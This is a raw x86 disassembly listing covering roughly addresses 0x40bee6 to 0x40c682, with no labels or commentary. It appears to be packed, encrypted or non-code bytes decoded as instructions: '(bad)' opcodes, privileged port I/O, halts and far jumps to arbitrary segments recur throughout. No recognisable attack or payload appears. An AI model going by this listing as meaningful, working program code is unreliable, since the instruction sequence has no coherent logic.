  40bee6:	dec    esp
  40bee7:	test   al,0xa1
  40bee9:	ja     0x40bebe
  40beeb:	cmp    DWORD PTR [ecx-0x22],0xffffffc8
  40beef:	cmc    
  40bef0:	or     BYTE PTR [edx],bl
  40bef2:	add    eax,0x70bf82c3
  40bef7:	loope  0x40beb9
  40bef9:	fisubr WORD PTR [esi-0xe]
  40befc:	je     0x40bec0
  40befe:	imul   esp,DWORD PTR [edi-0x46],0xbe8b1614
  40bf05:	in     eax,0xc5
  40bf07:	mov    esi,0xe9428b88
  40bf0c:	mov    cl,0xe0
  40bf0e:	mov    bl,0x42
  40bf10:	dec    esi
  40bf11:	test   eax,0xa615ea37
  40bf16:	inc    ebp
  40bf17:	aaa    
  40bf18:	mov    bh,0x26
  40bf1a:	out    0xce,al
  40bf1c:	retf   0x8597
  40bf1f:	and    BYTE PTR [eax-0x2193781e],0x4f
  40bf26:	repnz dec esp
  40bf28:	inc    esi
  40bf29:	add    BYTE PTR [ebx],0x86
  40bf2c:	sbb    al,0x2c
  40bf2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2f:	sub    ebx,DWORD PTR [ebx]
  40bf31:	pusha  
  40bf32:	pop    eax
  40bf33:	jns    0x40beca
  40bf35:	push   esp
  40bf36:	jmp    0x40bede
  40bf38:	fsub   DWORD PTR [ebp+0x6a]
  40bf3b:	push   ebx
  40bf3d:	sbb    eax,0x604249a2
  40bf42:	aad    0xb4
  40bf44:	fnstcw WORD PTR [esi-0x2b3f396b]
  40bf4a:	add    edi,DWORD PTR [edi]
  40bf4c:	adc    dh,BYTE PTR [ebp+0x31]
  40bf4f:	fcmovnbe st,st(1)
  40bf51:	and    cl,BYTE PTR [edx]
  40bf53:	or     DWORD PTR [eax+0x64],0x518317db
  40bf5a:	and    esp,eax
  40bf5c:	jo     0x40bf68
  40bf5e:	arpl   WORD PTR [esi+0x1745f176],di
  40bf64:	ret    0xd47b
  40bf67:	mov    ah,0xe3
  40bf69:	(bad)  
  40bf6a:	pop    ebp
  40bf6b:	jl     0x40bfe8
  40bf6d:	pushf  
  40bf6e:	add    cl,cl
  40bf70:	xchg   ecx,eax
  40bf71:	ins    DWORD PTR es:[edi],dx
  40bf72:	mov    dl,0xfc
  40bf74:	outs   dx,DWORD PTR ds:[esi]
  40bf75:	xor    DWORD PTR [ebp+0x4],esp
  40bf78:	mov    al,0x80
  40bf7a:	icebp  
  40bf7b:	fcom   QWORD PTR [edx+0x79c5cf7d]
  40bf81:	and    BYTE PTR [edx+eax*8],dh
  40bf84:	aad    0x12
  40bf86:	add    BYTE PTR [ebx-0x535bae32],bl
  40bf8c:	dec    edi
  40bf8d:	inc    ecx
  40bf8e:	popf   
  40bf8f:	push   edx
  40bf90:	inc    edi
  40bf91:	or     esp,eax
  40bf93:	fild   WORD PTR [esi]
  40bf95:	jecxz  0x40bf95
  40bf97:	jle    0x40bf3e
  40bf99:	loopne 0x40bf42
  40bf9b:	ret    0xecd7
  40bf9e:	mov    bh,0xe5
  40bfa0:	test   BYTE PTR [edx],al
  40bfa2:	cli    
  40bfa3:	lahf   
  40bfa4:	push   cs
  40bfa5:	call   0x4de6:0x2c79cf9e
  40bfac:	mov    ch,0x2d
  40bfae:	push   esi
  40bfaf:	sbb    bh,BYTE PTR [edx]
  40bfb1:	or     al,0x23
  40bfb3:	rcr    dl,cl
  40bfb5:	rcl    BYTE PTR [eax],1
  40bfb7:	ror    BYTE PTR [ebp-0x9],1
  40bfba:	dec    esi
  40bfbb:	inc    edi
  40bfbc:	shl    DWORD PTR [edi+0x58],1
  40bfbf:	mov    ecx,DWORD PTR [ebp+0x12]
  40bfc2:	xor    al,0x1a
  40bfc4:	mov    ds:0xca66478c,al
  40bfc9:	jmp    0xb2bf8676
  40bfce:	jbe    0x40c023
  40bfd0:	inc    ebx
  40bfd1:	lahf   
  40bfd2:	or     ch,bl
  40bfd4:	sar    BYTE PTR [edx+ecx*1-0xd85e85a],cl
  40bfdb:	push   es
  40bfdc:	shl    BYTE PTR ds:0xe581d643,cl
  40bfe2:	sbb    al,0x10
  40bfe4:	jp     0x40bf7a
  40bfe6:	mov    ch,0x57
  40bfe8:	push   0xd
  40bfea:	hlt    
  40bfeb:	out    0x2c,al
  40bfed:	fbld   TBYTE PTR ds:0xe2281c8f
  40bff3:	or     al,0x1d
  40bff5:	test   DWORD PTR [ebx-0x77],edx
  40bff8:	or     DWORD PTR [eax-0x581b9b29],0xffffff9f
  40bfff:	fidiv  WORD PTR [ebx-0x6]
  40c002:	xor    eax,0x3f870c95
  40c007:	jbe    0x40c003
  40c009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c00a:	mov    esi,0x246b14c5
  40c00f:	cwde   
  40c010:	imul   ebx,DWORD PTR [edi],0x7bea1c4e
  40c016:	add    edx,edi
  40c018:	ss dec esi
  40c01a:	aaa    
  40c01b:	adc    al,0x80
  40c01d:	stos   BYTE PTR es:[edi],al
  40c01e:	(bad)  
  40c020:	sahf   
  40c021:	or     eax,ebp
  40c023:	mov    bl,0xcb
  40c025:	in     al,0x71
  40c027:	push   0xcb53e5be
  40c02c:	sbb    BYTE PTR [ecx+0x20],0x1b
  40c030:	push   ds
  40c031:	jbe    0x40bff5
  40c033:	ret    
  40c034:	dec    eax
  40c035:	push   0xffffffec
  40c037:	ins    DWORD PTR es:[edi],dx
  40c038:	not    DWORD PTR [esi]
  40c03a:	sub    al,0xeb
  40c03c:	mov    eax,0x651c3a45
  40c041:	and    eax,0x2a19a1da
  40c046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c047:	mov    ds:0xdb801478,eax
  40c04c:	jo     0x40c0a0
  40c04e:	mov    edx,0x96bca4c2
  40c053:	and    eax,0x71c1f73a
  40c058:	dec    esp
  40c059:	fs in  al,dx
  40c05b:	jmp    0xa818826b
  40c060:	jne    0x40c0de
  40c062:	pop    ds
  40c063:	into   
  40c064:	div    edi
  40c066:	mov    eax,ds:0x52417d7b
  40c06b:	xchg   ebx,eax
  40c06c:	lds    eax,FWORD PTR [esi]
  40c06e:	call   0xc787125b
  40c073:	push   esi
  40c074:	mov    ch,0x2d
  40c076:	pusha  
  40c077:	repnz add bh,BYTE PTR [edx]
  40c07a:	pop    es
  40c07b:	jae    0x40c0db
  40c07d:	sub    BYTE PTR [ecx+0x2be6f2d3],bl
  40c083:	mov    ecx,0xe831b72
  40c088:	xor    bh,BYTE PTR [edx-0x4c]
  40c08b:	mov    ebx,0x9f293446
  40c090:	xchg   BYTE PTR [esi+0x45342053],ch
  40c096:	sub    eax,0xff212756
  40c09b:	lahf   
  40c09c:	push   ecx
  40c09d:	mov    ds:0x9f8d57d8,eax
  40c0a2:	adc    ch,bh
  40c0a4:	push   ds
  40c0a5:	aaa    
  40c0a6:	xchg   edx,eax
  40c0a7:	mov    ah,0x31
  40c0a9:	sar    DWORD PTR [edi+0x5dbc4af1],cl
  40c0af:	mov    ebx,0x58ed6037
  40c0b4:	aas    
  40c0b5:	mov    DWORD PTR [edx-0x426b3608],esi
  40c0bb:	addr16 in al,dx
  40c0bd:	jle    0x40c134
  40c0bf:	add    BYTE PTR [ecx+eax*1+0x0],ah
  40c0c3:	pushf  
  40c0c4:	pop    esi
  40c0c5:	ins    BYTE PTR es:[edi],dx
  40c0c6:	mov    eax,0x4ce9049b
  40c0cb:	je     0x40c0aa
  40c0cd:	fistp  WORD PTR [edi]
  40c0cf:	scas   eax,DWORD PTR es:[edi]
  40c0d0:	add    cl,BYTE PTR [esi-0xa]
  40c0d3:	fwait
  40c0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d5:	xor    esi,esi
  40c0d7:	hlt    
  40c0d8:	clc    
  40c0d9:	out    0x54,al
  40c0db:	mov    ah,0xbc
  40c0dd:	nop
  40c0de:	add    ecx,DWORD PTR [edi+ebp*1]
  40c0e1:	inc    ecx
  40c0e2:	lahf   
  40c0e3:	(bad)  
  40c0e4:	pop    ebx
  40c0e5:	sbb    bl,BYTE PTR [esi-0x68]
  40c0e8:	mov    bh,0xe8
  40c0ea:	cdq    
  40c0eb:	clc    
  40c0ec:	mov    al,0x7c
  40c0ee:	repz mov edi,0x1c391e3a
  40c0f4:	fwait
  40c0f5:	pop    edi
  40c0f6:	sti    
  40c0f7:	push   esi
  40c0f8:	cld    
  40c0f9:	enter  0x7ead,0xe0
  40c0fd:	lahf   
  40c0fe:	pop    esp
  40c0ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c100:	retf   
  40c101:	mov    esp,0x7cde89d3
  40c106:	cs sbb eax,0x80547637
  40c10c:	mov    al,0x58
  40c10e:	mov    bl,0xd9
  40c110:	lahf   
  40c111:	dec    ecx
  40c112:	push   ds
  40c113:	ss (bad) 
  40c115:	out    dx,eax
  40c116:	mov    ah,0x49
  40c118:	outs   dx,DWORD PTR ds:[esi]
  40c119:	sbb    ebx,DWORD PTR [ecx-0x79]
  40c11c:	(bad)  
  40c11d:	not    BYTE PTR [ebp+0x42fa35d1]
  40c123:	push   ss
  40c124:	adc    ch,bh
  40c126:	and    BYTE PTR [ebp-0x44bdcdef],bl
  40c12c:	mov    ecx,0x8ad78b13
  40c131:	push   esi
  40c132:	(bad)  
  40c133:	mov    al,0x16
  40c135:	dec    ecx
  40c136:	add    eax,0xc0df530
  40c13b:	jmp    0x70ab:0xb10d9f43
  40c142:	inc    esp
  40c143:	icebp  
  40c144:	loopne 0x40c184
  40c146:	pop    es
  40c147:	add    dh,bl
  40c149:	jle    0x40c0f7
  40c14b:	pop    edi
  40c14c:	sbb    al,0x7b
  40c14e:	clc    
  40c14f:	inc    ebp
  40c150:	pop    esp
  40c151:	or     al,dl
  40c153:	adc    BYTE PTR [esi-0x12],ch
  40c156:	pop    ss
  40c157:	fmul   QWORD PTR [di+0x526]
  40c15c:	shl    BYTE PTR [edi-0x4a],1
  40c15f:	imul   edi,DWORD PTR [ebx],0x28
  40c162:	sub    ah,BYTE PTR [edx+eax*2]
  40c165:	xchg   esp,eax
  40c166:	and    DWORD PTR [ecx+0x61],ecx
  40c169:	push   esi
  40c16a:	mov    ds:0x5c821ea8,eax
  40c16f:	into   
  40c170:	mov    bh,BYTE PTR [eax+0x22d0b2c]
  40c176:	inc    esp
  40c177:	inc    esi
  40c178:	aam    0xd
  40c17a:	pop    eax
  40c17b:	fsub   DWORD PTR [eax+0x27]
  40c17e:	shl    DWORD PTR [ebx],0x32
  40c181:	jae    0x40c1a4
  40c183:	pop    esi
  40c184:	fwait
  40c185:	ss jge 0x40c13a
  40c188:	cli    
  40c189:	mov    al,ds:0xd361ba74
  40c18e:	and    al,0x44
  40c190:	jmp    0xec34865a
  40c195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c196:	and    BYTE PTR [edi+0x2395948c],cl
  40c19c:	xchg   edi,eax
  40c19d:	leave  
  40c19e:	or     al,bh
  40c1a0:	ja     0x40c188
  40c1a2:	sub    bh,BYTE PTR [ecx-0x69]
  40c1a5:	dec    esp
  40c1a6:	arpl   WORD PTR ds:0xfacdfef0,dx
  40c1ac:	add    eax,0xb69fbdba
  40c1b1:	popa   
  40c1b2:	add    eax,0x3e459b
  40c1b7:	and    DWORD PTR [eax+0x4e2d7131],edi
  40c1bd:	mov    esp,0x93a09cc7
  40c1c2:	dec    esp
  40c1c3:	sub    edi,edx
  40c1c5:	and    al,0xf4
  40c1c7:	gs (bad) 
  40c1c9:	push   ecx
  40c1ca:	sub    BYTE PTR [ebp+0x5f],bl
  40c1cd:	scas   al,BYTE PTR es:[edi]
  40c1ce:	stos   DWORD PTR es:[edi],eax
  40c1cf:	mov    ecx,esi
  40c1d1:	scas   eax,DWORD PTR es:[edi]
  40c1d2:	and    eax,0x208a7e30
  40c1d7:	ja     0x40c1c9
  40c1d9:	in     al,dx
  40c1da:	or     eax,DWORD PTR [ecx+0x270c077d]
  40c1e0:	dec    eax
  40c1e1:	sar    BYTE PTR [ebx],cl
  40c1e3:	push   esi
  40c1e4:	xchg   esp,eax
  40c1e5:	je     0x40c17a
  40c1e7:	in     al,0xb5
  40c1e9:	inc    esi
  40c1ea:	ret    
  40c1eb:	push   eax
  40c1ec:	sbb    al,0x53
  40c1ee:	test   al,0x34
  40c1f0:	addr16 stc 
  40c1f2:	retf   0x8b90
  40c1f5:	nop
  40c1f6:	jns    0x40c226
  40c1f8:	or     esi,DWORD PTR [ecx-0x414fa58e]
  40c1fe:	mov    ds:0x1ce6dec8,eax
  40c203:	xor    esp,DWORD PTR [eax*2+0x306f3122]
  40c20a:	xor    ah,bl
  40c20c:	leave  
  40c20d:	aas    
  40c20e:	hlt    
  40c20f:	mov    ecx,0x4d57fbd8
  40c214:	mov    WORD PTR [eax],gs
  40c216:	add    al,0x47
  40c218:	jns    0x40c1e1
  40c21a:	mov    al,ds:0x9831a6f7
  40c21f:	cs push es
  40c221:	and    eax,0x8f7d53e4
  40c226:	xlat   BYTE PTR ds:[ebx]
  40c227:	pop    es
  40c228:	and    al,0xfa
  40c22a:	push   ebx
  40c22b:	call   FWORD PTR [ebx]
  40c22d:	fcmovbe st,st(6)
  40c22f:	cmp    al,0xe1
  40c231:	inc    edi
  40c232:	inc    edi
  40c233:	jp     0x40c1c3
  40c235:	ds in  eax,dx
  40c237:	cmp    eax,0x26612f13
  40c23c:	push   esi
  40c23d:	iret   
  40c23e:	push   0x6a
  40c240:	data16 mov WORD PTR [eax],es
  40c243:	fmul   QWORD PTR [esi+esi*4-0x127dbc58]
  40c24a:	jnp    0x40c2ab
  40c24c:	mov    edi,0x150401c0
  40c251:	push   ecx
  40c252:	shr    DWORD PTR [ecx+edi*2],0xdc
  40c256:	enter  0x67a9,0xbe
  40c25a:	push   es
  40c25b:	mov    al,ds:0xc2a760b6
  40c260:	shr    DWORD PTR [eax],0x95
  40c263:	call   0xf7bc:0xcbc5af13
  40c26a:	test   DWORD PTR fs:[ecx],0x28687acc
  40c271:	sbb    dl,BYTE PTR [esi-0x18]
  40c274:	outs   dx,DWORD PTR ds:[esi]
  40c275:	jg     0x40c2e5
  40c277:	xchg   DWORD PTR [ebp+0x4bcc8f32],ebp
  40c27d:	inc    ebp
  40c27e:	and    BYTE PTR [edi],ah
  40c280:	push   edi
  40c281:	enter  0x112,0x30
  40c285:	in     al,0x42
  40c287:	into   
  40c288:	ja     0x40c28e
  40c28a:	hlt    
  40c28b:	and    DWORD PTR [ecx+0x68],ecx
  40c28e:	and    al,0x9b
  40c290:	xor    BYTE PTR [eax],0x74
  40c293:	sub    al,0xe0
  40c295:	xchg   ebx,eax
  40c296:	add    esp,edi
  40c298:	cmp    BYTE PTR [edi+eax*2],al
  40c29b:	push   edx
  40c29c:	stc    
  40c29d:	nop    DWORD PTR [edx-0x42]
  40c2a1:	clc    
  40c2a2:	sub    al,0xd6
  40c2a4:	rol    ch,1
  40c2a6:	repz popf 
  40c2a8:	(bad)  [esi-0x5e]
  40c2ab:	cmp    eax,0x6c966b08
  40c2b0:	je     0x40c30c
  40c2b2:	mov    esi,0xe4f4f15e
  40c2b7:	aad    0xf2
  40c2b9:	mov    edi,DWORD PTR [ecx]
  40c2bb:	xchg   ecx,eax
  40c2bc:	lahf   
  40c2bd:	loopne 0x40c26d
  40c2bf:	and    ebx,DWORD PTR [ebp+0x1]
  40c2c2:	ficom  WORD PTR [ebp+0x6b]
  40c2c5:	nop
  40c2c6:	dec    BYTE PTR [edx]
  40c2c8:	je     0x40c289
  40c2ca:	cmp    eax,0xe586c512
  40c2cf:	mov    dh,0x46
  40c2d1:	test   BYTE PTR [edi+0x7],dh
  40c2d4:	xor    al,0xab
  40c2d6:	hlt    
  40c2d7:	loop   0x40c303
  40c2d9:	scas   al,BYTE PTR es:[edi]
  40c2da:	mov    cl,BYTE PTR [edi+0x29]
  40c2dd:	fcmovb st,st(7)
  40c2df:	jmp    0xc853:0xff2be21f
  40c2e6:	mov    WORD PTR [esi+0x1e24a763],fs
  40c2ec:	mov    edx,0x4c5d3180
  40c2f1:	fadd   QWORD PTR [esi-0x4c]
  40c2f4:	inc    ebp
  40c2f5:	je     0x40c288
  40c2f7:	in     eax,dx
  40c2f8:	mov    bh,0xa
  40c2fa:	pop    esp
  40c2fb:	loope  0x40c369
  40c2fd:	and    al,0xfc
  40c2ff:	gs (bad) 
  40c301:	push   ss
  40c302:	jno    0x40c2ad
  40c304:	sub    eax,DWORD PTR [ecx]
  40c306:	mov    cl,0xd7
  40c308:	out    dx,eax
  40c309:	imul   ebx,edx,0x2a5825f8
  40c30f:	inc    esp
  40c310:	cmp    ecx,DWORD PTR [edi+ebx*1-0x55a7aea0]
  40c317:	adc    al,0x90
  40c319:	xchg   ebp,eax
  40c31a:	or     BYTE PTR [edx],bl
  40c31c:	cmp    DWORD PTR [edi+0x30a19f1a],esi
  40c322:	test   eax,0x3b7a6f57
  40c327:	or     esp,DWORD PTR [edi+0x72647fe]
  40c32d:	call   0x8159:0x1eb15063
  40c334:	shl    BYTE PTR [ecx+0x7c],0x4b
  40c338:	push   ebp
  40c339:	das    
  40c33a:	push   edx
  40c33b:	test   al,0x97
  40c33d:	cmp    bl,al
  40c33f:	and    dl,bh
  40c341:	xor    ah,bh
  40c343:	lds    esp,FWORD PTR [edi]
  40c345:	ss leave 
  40c347:	retf   0xe9d2
  40c34a:	mov    WORD PTR [ecx-0x458167cb],gs
  40c350:	or     edx,0x50
  40c353:	loopne 0x40c3b0
  40c355:	push   0x2429ba50
  40c35a:	pop    ebx
  40c35b:	test   al,0x93
  40c35d:	or     al,0x84
  40c35f:	mov    ah,0x15
  40c361:	ins    BYTE PTR es:[edi],dx
  40c362:	sub    BYTE PTR [edx-0x10],dl
  40c365:	fwait
  40c366:	mov    WORD PTR [esi+ebp*2-0x5e],?
  40c36a:	mov    ds:0xb953837a,al
  40c36f:	jns    0x40c3e5
  40c371:	pop    edx
  40c372:	pop    ss
  40c373:	shr    esp,0xc7
  40c376:	xor    al,0xc6
  40c378:	sbb    eax,0x37f1cfcf
  40c37d:	xchg   BYTE PTR [edi],al
  40c37f:	mov    es,WORD PTR [ecx-0x5b]
  40c382:	into   
  40c383:	push   esi
  40c384:	or     eax,0xe65609de
  40c389:	mov    ecx,0x61f7087c
  40c38e:	fwait
  40c38f:	xlat   BYTE PTR ds:[ebx]
  40c390:	dec    ebx
  40c391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c392:	jle    0x40c40f
  40c394:	mov    WORD PTR [edx+0x75b62200],?
  40c39a:	sub    al,0xe0
  40c39c:	sbb    al,0x59
  40c39e:	shl    BYTE PTR [ebx-0x44],0xee
  40c3a2:	lea    esp,[edx-0x40]
  40c3a5:	test   eax,0x288e345d
  40c3aa:	mov    al,ds:0xc7fbfe60
  40c3af:	cmc    
  40c3b0:	cmc    
  40c3b1:	jecxz  0x40c400
  40c3b3:	pop    edi
  40c3b4:	test   DWORD PTR [esi+0x35cab7ac],0x692ca3a0
  40c3be:	add    al,0xd8
  40c3c0:	hlt    
  40c3c1:	mov    al,0x6b
  40c3c3:	hlt    
  40c3c4:	mov    eax,ds:0xfed28ac1
  40c3c9:	jae    0x40c3e1
  40c3cb:	push   ebp
  40c3cc:	xor    DWORD PTR [esi+0x69],0xffffffed
  40c3d0:	aam    0x1c
  40c3d2:	push   ds
  40c3d3:	add    ebp,0x227958ae
  40c3d9:	lahf   
  40c3da:	jmp    0xce8c282
  40c3df:	pushf  
  40c3e0:	push   ss
  40c3e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3e2:	(bad)
  40c3e6:	sbb    eax,0x9cac6349
  40c3eb:	adc    esp,DWORD PTR [edx+0x14]
  40c3ee:	shl    BYTE PTR [edi],1
  40c3f0:	push   edx
  40c3f1:	add    DWORD PTR [ecx],ebx
  40c3f3:	ret    0x5ef0
  40c3f6:	dec    edi
  40c3f7:	mov    edi,0xa607d8a4
  40c3fc:	mov    bl,bh
  40c3fe:	sub    esp,DWORD PTR [edx+0x1a]
  40c401:	(bad)  
  40c402:	data16 xor BYTE PTR [esp+edx*1],ch
  40c406:	cmp    al,0x10
  40c408:	push   ss
  40c409:	adc    DWORD PTR [edx],esp
  40c40b:	push   cs
  40c40c:	push   esi
  40c40d:	bound  edi,QWORD PTR [edi+0x7325e74b]
  40c413:	jecxz  0x40c42b
  40c415:	pop    ebp
  40c416:	push   es
  40c417:	mov    dh,0xb2
  40c419:	mov    WORD PTR [eax],ds
  40c41b:	add    ebx,DWORD PTR [ebx+0x66d1e89d]
  40c421:	call   0xb795:0x2b66c41d
  40c428:	idiv   DWORD PTR [esp+eax*8]
  40c42b:	add    DWORD PTR [edx-0x25d348c],ebx
  40c431:	mov    ah,0x63
  40c433:	xor    DWORD PTR [esi+0x34],0x66e795d3
  40c43a:	pop    es
  40c43b:	push   es
  40c43c:	sub    bl,BYTE PTR [ecx-0x16]
  40c43f:	cmc    
  40c440:	and    DWORD PTR [edi],ebp
  40c442:	jl     0x40c495
  40c444:	call   0x786f4062
  40c449:	(bad)  
  40c44a:	hlt    
  40c44b:	adc    al,ah
  40c44d:	lods   al,BYTE PTR ds:[esi]
  40c44e:	shl    ebx,0x74
  40c451:	xor    DWORD PTR [edi+0x2d],ecx
  40c454:	mov    edi,0xa351df22
  40c459:	pop    ecx
  40c45a:	sub    DWORD PTR [eax+0x11],edx
  40c45d:	in     al,0x11
  40c45f:	add    al,0xf
  40c461:	xchg   ebx,eax
  40c462:	xor    al,0x7b
  40c464:	sbb    BYTE PTR [edx+ebx*8],bl
  40c467:	iret   
  40c468:	mov    bl,0x8a
  40c46a:	and    al,0xa8
  40c46c:	pushf  
  40c46d:	call   0xe4eb62be
  40c472:	sahf   
  40c473:	fistp  DWORD PTR ds:0xa0b4211a
  40c479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c47a:	jae    0x40c430
  40c47c:	dec    esi
  40c47d:	add    DWORD PTR [esi+0x51],ebx
  40c480:	out    dx,eax
  40c481:	and    DWORD PTR [ecx-0x37],ecx
  40c484:	mov    ds:0x48760a4,al
  40c489:	stos   DWORD PTR es:[edi],eax
  40c48a:	mov    esp,0x5c372c8e
  40c48f:	jns    0x40c455
  40c491:	pop    ecx
  40c492:	ret    
  40c493:	repnz inc ebp
  40c495:	fpatan 
  40c497:	cmp    DWORD PTR [esi],ebp
  40c499:	add    ebp,DWORD PTR [ecx]
  40c49b:	test   DWORD PTR [edx+ecx*8-0x6c9abaea],ecx
  40c4a2:	stos   BYTE PTR es:[edi],al
  40c4a3:	cmp    eax,0xec0c7f0f
  40c4a8:	test   al,0x4f
  40c4aa:	call   0x28fe:0xebc59199
  40c4b1:	outs   dx,DWORD PTR ds:[esi]
  40c4b2:	push   0x91516d10
  40c4b7:	mov    esi,0x6b4d5f2a
  40c4bc:	push   cs
  40c4bd:	adc    DWORD PTR [ebx],ebx
  40c4bf:	sahf   
  40c4c0:	das    
  40c4c1:	mov    bh,0x1
  40c4c3:	setno  BYTE PTR ds:0x2ee73fc0
  40c4ca:	adc    edx,DWORD PTR [edx+edi*8+0x43da8ab8]
  40c4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4d2:	imul   ecx,DWORD PTR [edi-0x5f],0xd1554a95
  40c4d9:	cmp    DWORD PTR [ebx+0x42563927],eax
  40c4df:	daa    
  40c4e0:	xlat   BYTE PTR ds:[ebx]
  40c4e1:	or     BYTE PTR [esi-0x59],bh
  40c4e4:	sbb    bl,BYTE PTR [edx]
  40c4e6:	and    ch,BYTE PTR [eax+0x74]
  40c4e9:	jbe    0x40c539
  40c4eb:	and    ah,ah
  40c4ed:	shl    BYTE PTR [edi+0x279206dd],0xa1
  40c4f4:	or     DWORD PTR [edx-0x2c],0x38
  40c4f8:	sbb    esi,0x7d
  40c4fb:	adc    al,0x1f
  40c4fd:	test   BYTE PTR [edi-0x73],bh
  40c500:	dec    ebx
  40c501:	sub    al,0x7f
  40c503:	imul   ebx,DWORD PTR [ecx+0x40],0xffffffd9
  40c507:	ret    
  40c508:	sub    ebp,DWORD PTR [eax+0x7a3f7a2f]
  40c50e:	and    bl,BYTE PTR [eax+0x5a]
  40c511:	test   eax,0xe7b851d7
  40c516:	stos   BYTE PTR es:[edi],al
  40c517:	pushf  
  40c518:	call   0x1c6f:0x8a4e5ded
  40c51f:	xor    dh,BYTE PTR [edx+ecx*8+0x17]
  40c523:	cmp    BYTE PTR [edx-0x66fe4eb3],dh
  40c529:	or     al,0xe6
  40c52b:	or     eax,edx
  40c52d:	in     eax,0xb3
  40c52f:	fs mov dl,0x11
  40c532:	in     al,dx
  40c533:	(bad)  
  40c534:	pop    edi
  40c535:	xor    ebp,DWORD PTR [edx-0x2eab8df8]
  40c53b:	and    DWORD PTR ds:0xcbb30e95,ebp
  40c541:	pushf  
  40c542:	call   0xe012:0xbd3cae82
  40c549:	fiadd  DWORD PTR ds:0x5d4b2192
  40c54f:	cwde   
  40c550:	sub    BYTE PTR [edx-0x4af7b39b],al
  40c556:	loop   0x40c573
  40c558:	cmp    DWORD PTR [esi],0xcc4231e9
  40c55e:	cmp    eax,0xb9d2dccc
  40c563:	jns    0x40c52d
  40c565:	mov    ah,0x23
  40c567:	aam    0x75
  40c569:	pop    ds
  40c56a:	gs pusha 
  40c56c:	jne    0x40c51c
  40c56e:	and    eax,0xe26ae465
  40c573:	lea    eax,fs:[edi+0x15]
  40c577:	mov    esp,edx
  40c579:	add    al,0x84
  40c57b:	and    edi,DWORD PTR [esi+edx*2]
  40c57e:	out    0xc5,al
  40c580:	es jbe 0x40c59e
  40c583:	enter  0xa147,0xbb
  40c587:	popa   
  40c588:	lock sub DWORD PTR [edi+0x12abf182],eax
  40c58f:	pop    esp
  40c590:	js     0x40c527
  40c592:	lods   eax,DWORD PTR ss:[esi]
  40c594:	dec    ebp
  40c595:	sbb    DWORD PTR [edi+ebp*1],ebp
  40c598:	call   0xfd6f:0x2f0d3ccd
  40c59f:	ficom  WORD PTR [esp+edx*8-0x247d5dd5]
  40c5a6:	(bad)  
  40c5a7:	add    ebx,DWORD PTR [ecx+ecx*4+0x7e]
  40c5ab:	ins    BYTE PTR es:[edi],dx
  40c5ac:	mov    ebx,0x9eac5da4
  40c5b1:	mov    ebx,0x16acb60f
  40c5b6:	dec    esp
  40c5b7:	test   al,0x2d
  40c5b9:	jae    0x40c5ac
  40c5bb:	pop    ebx
  40c5bc:	xor    al,0x1d
  40c5be:	inc    esi
  40c5bf:	mov    esi,0x55b4c4c9
  40c5c4:	test   DWORD PTR [edx-0x2b],edi
  40c5c7:	test   BYTE PTR [ebx],bh
  40c5c9:	inc    eax
  40c5ca:	stc    
  40c5cb:	gs push 0xccaec32b
  40c5d1:	dec    edx
  40c5d2:	xchg   ebx,eax
  40c5d3:	adc    ch,dl
  40c5d5:	popa   
  40c5d6:	iret   
  40c5d7:	adc    al,0xf0
  40c5d9:	leave  
  40c5da:	dec    ebp
  40c5db:	in     eax,dx
  40c5dc:	aam    0xdf
  40c5de:	pop    ds
  40c5df:	pushf  
  40c5e0:	mov    BYTE PTR [edi+ebx*1],ch
  40c5e3:	xor    eax,0xe7a63c30
  40c5e8:	push   0xffffffff
  40c5ea:	jb     0x40c603
  40c5ec:	aad    0xcf
  40c5ee:	pushf  
  40c5ef:	int    0x16
  40c5f1:	lock out 0x50,al
  40c5f4:	or     DWORD PTR [ecx],edx
  40c5f6:	loop   0x40c63c
  40c5f8:	imul   ecx,DWORD PTR [edi-0x5165590d],0xffffffc0
  40c5ff:	(bad)  
  40c600:	push   ecx
  40c601:	clc    
  40c602:	test   eax,0x460b3d47
  40c607:	or     BYTE PTR [edx],bl
  40c609:	push   ss
  40c60a:	sti    
  40c60b:	dec    ebp
  40c60c:	dec    edi
  40c60d:	inc    edi
  40c60e:	addr16 or ecx,eax
  40c611:	rol    esp,0x18
  40c614:	cmc    
  40c615:	xor    edi,DWORD PTR [ebp-0x7a425dae]
  40c61b:	bound  edx,QWORD PTR [esi-0x58]
  40c61e:	push   ecx
  40c61f:	imul   edx,DWORD PTR [esi-0x193a7d17],0xc4cff293
  40c629:	(bad)  
  40c62a:	ja     0x40c651
  40c62c:	stos   BYTE PTR es:[edi],al
  40c62d:	aaa    
  40c62e:	aas    
  40c62f:	je     0x40c679
  40c631:	jb     0x40c676
  40c633:	lods   eax,DWORD PTR ds:[esi]
  40c634:	mov    al,0xbf
  40c636:	pusha  
  40c637:	or     eax,0x9a0f7ac3
  40c63c:	add    eax,0xfc8bfc69
  40c641:	mov    ds,ecx
  40c643:	stos   BYTE PTR es:[edi],al
  40c644:	and    eax,0x8f7bc5de
  40c649:	xchg   edi,eax
  40c64a:	test   eax,0x465ff120
  40c64f:	xchg   esi,eax
  40c650:	addr16 push esi
  40c652:	fdiv   QWORD PTR [edi-0x3f]
  40c655:	aad    0xeb
  40c657:	stos   DWORD PTR es:[edi],eax
  40c658:	cs push esp
  40c65a:	lods   eax,DWORD PTR ds:[esi]
  40c65b:	pop    ebp
  40c65c:	xor    DWORD PTR [ebx+0x3f],esp
  40c65f:	gs mov ebp,0x6a5c1870
  40c665:	loop   0x40c63d
  40c667:	pop    ecx
  40c668:	xchg   ebp,eax
  40c669:	fst    DWORD PTR [ebx+0x1e]
  40c66c:	mov    bl,0x49
  40c66e:	sbb    sp,si
  40c671:	inc    edx
  40c672:	in     eax,dx
  40c673:	add    al,0xa
  40c675:	xlat   BYTE PTR ds:[ebx]
  40c676:	or     eax,0x54becdd
  40c67b:	test   BYTE PTR [edi],cl
  40c67d:	ja     0x40c6e6
  40c67f:	in     eax,0xfa
  40c681:	pop    ebx
  40c682:	or     al,BYTE PTR [esi-0x5c]
